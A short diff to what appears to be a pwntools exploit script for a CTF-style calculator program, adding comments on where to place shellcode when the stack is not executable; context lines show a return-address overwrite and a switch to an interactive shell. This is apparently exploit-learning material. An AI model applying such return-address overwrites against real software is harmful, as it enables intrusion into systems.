@@ -71,6 +71,13 @@ io.sendline('-1')
 # In this case we set the return address to the address right
 # below the overwritten return address (assuming the stack is
 # executable).
+# What if the stack is not executable? We could try to write
+# the payload somewhere else. One idea could be to write the
+# payload in the buffer allocated by getline() (to make sure
+# that enough room is available we could just send an very
+# long and invalid 'get' command, e.g. 'get xxxxxxxxxx[...]').
+# But how can we get the value returned from getline()? We
+# only know that this address is stored at rbp-0x38.
 cmd = 'set %lu %ld' % (write_index, ptr_to_calculator_ret_addr+8)
 print(cmd)
 io.sendline(cmd)
@@ -91,4 +98,3 @@ io.sendline('bye')
 
 # Switch to interactive mode to use the shell.
 io.interactive()
-
